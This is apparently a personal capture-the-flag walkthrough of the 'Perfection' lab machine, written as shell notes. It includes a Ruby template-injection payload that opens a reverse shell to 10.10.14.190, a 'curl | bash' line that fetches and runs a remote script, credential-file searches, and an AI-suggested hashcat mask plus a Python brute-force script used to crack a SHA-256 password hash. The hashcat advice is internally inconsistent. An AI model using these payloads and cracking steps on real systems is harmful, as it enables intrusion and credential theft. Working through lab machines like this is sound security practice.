## Perfection
```sh
nmap -p- -sV -sC --min-rate=100000 10.129.201.231
nmap -p- -sV -sC --min-rate=100000 10.129.202.231 --script vuln

sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.129.201.231/ -x rb,php,html,txt,json -r
#doesnt deliver anything new
sqlmap -u "http://10.129.201.231/weighted-grade-calc" --data "category1=*&grade1=*&weight1=*&category2=*&grade2=*&weight2=*&category3=*&grade3=*&weight3=*&category4=*&grade4=*&weight4=*&category5=*&grade5=*&weight5=*"
#doesnt deliver anything
#weighted grade calc seems to still be only entry point so I researched what can be tried in input fields, its an ruby machine that is what webanalyzer told us. And it seems not to be sql injectable
#but maybe command injections
# tried  category1=test|&grade1=1&weight1=10&category2=test2&grade2=3&weight2=20&category3=test3&grade3=1&weight3=20&category4=test4&grade4=5&weight4=10&category5=test5&grade5=1&weight5=40 
# said malicious input blocked
# tried  category1=test|&grade1=1&weight1=10&category2=test2&grade2=3&weight2=20&category3=test3&grade3=1&weight3=20&category4=test4&grade4=5&weight4=10&category5=test5&grade5=1&weight5=40 
# down on the page is written Enter "N/A" into the category field and 0 into the grade and weight fields if you are not using a row.
# category1=N/A//echo "test"&grade1=1&weight1=10&category2=test2&grade2=3&weight2=20&category3=test3&grade3=1&weight3=20&category4=test4&grade4=5&weight4=10&category5=test5&grade5=1&weight5=40 
# Malicious input blocked
# but my tests shows | is blocked / not
# i tried around a ton now
# test;//ls malicious input blocked
#this worked:
#category1=abcd%0a<%25=spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.190",1338))%25>&grade1=90&weight1=100&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
#abcd%0a<%25=spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.190",1338))%25>
#abcd is the usual content %0a is a newline <%25 is % and %25> is > this is all to avoid the detection message
# i have to say i didnt found this myself i found it on the forum but its good to understand I now have to find out how i can systematically come to that.
cat /home/susan/user.txt

curl 10.10.14.190:8001/shell.sh|bash
# i found an sql lite db with following content: 
#��^�ableusersusersCREATE TABLE users (
#id INTEGER PRIMARY KEY,
#name TEXT,
#password TEXT
#a�\
#Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f��P#�
#so the hash is but question is if this is root:
#abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
grep -r "abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f" /opt #to much results

grep -ri "password" /var/spool 2>/dev/null #to much results
find / -type f -iname "*login*" 2>/dev/null 
find / -type f -iname "*password*" 2>/dev/null
find / -type f -iname "*susan*" 2>/dev/null
#found an mail which says how to crack the following with john: Name: Susan Miller. {firstname}{firstname backwards}{randomly generated integer between 1 and 1,000,000,000}
# asked github copilot 

#how to crack the following with john: Name: Susan Miller. {firstname}{firstname backwards}{randomly generated integer between 1 and 1,000,000,000} the hash is abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
#answer: To crack the hash using John the Ripper, you would first need to create a custom wordlist that matches the pattern {firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}. However, generating such a wordlist would be computationally expensive and time-consuming due to the large number of possibilities.  Instead, you can use a tool like hashcat with a mask attack, which is more suitable for this kind of task. Here's how you can do it:  
#Create a file named hash.txt and put the hash abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f in it.
#Create a custom charset file named custom.hcchr with the following content:
#Susan
#nasuS
#Run hashcat with the mask attack option:
#hashcat -a 3 -m 1400 hash.txt ?d?d?d?d?d?d?d?d?d --custom-charset1=custom.hcchr
#This command tells hashcat to use a mask attack (-a 3) with the SHA-256 hash type (-m 1400). The mask ?1?2?d?d?d?d?d?d?d?d represents the pattern {firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}. The ?1 and ?2 are placeholders for the custom charsets defined in custom.hcchr, and the ?d placeholders represent digits.  
#Please note that cracking hashes can take a long time and requires a lot of computational power, especially for complex patterns and large numbers of possibilities. Also, please ensure that you have the legal right to crack the hash before proceeding.
# 
```
that just give a lot of errors so i tried with chat gpt4 got this
```python
import hashlib

# The hash we're trying to match
target_hash = "abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f"
# The first name, in lowercase and then reversed
firstname = "susan"
firstname_reversed = firstname[::-1]

# Determine 1% of the total range for progress updates
total_attempts = 1000000000  # 1 billion
progress_interval = total_attempts // 100  # 1% of total attempts

# Example of how the loop starts, pseudocode for the rest
for i in range(1, 1000000001):  # This loop would be impractically long to run here
    # Creating the password format
    password = f"{firstname}_{firstname_reversed}_{i}"
    # Hashing the password
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    # Check if the generated hash matches the target hash
    if hashed_password == target_hash:
        print(f"Match found: {password}")
        break
    # Print progress at each 1%
    if i % progress_interval == 0:
        percent_complete = (i / total_attempts) * 100
        print(f"Progress: {percent_complete:.2f}% complete, currently at {i} attempts.")
```
This was the result: susan_nasus_413759210
```sh
# i had to re ssh into the machine else it didnt worked
# with that login i got acces but root flag wasnt on usual place cat ~/root.txt 
#so: 
find / -type f -name "root.txt" 2>/dev/null
/root/root.txt
cat /root/root.txt
```
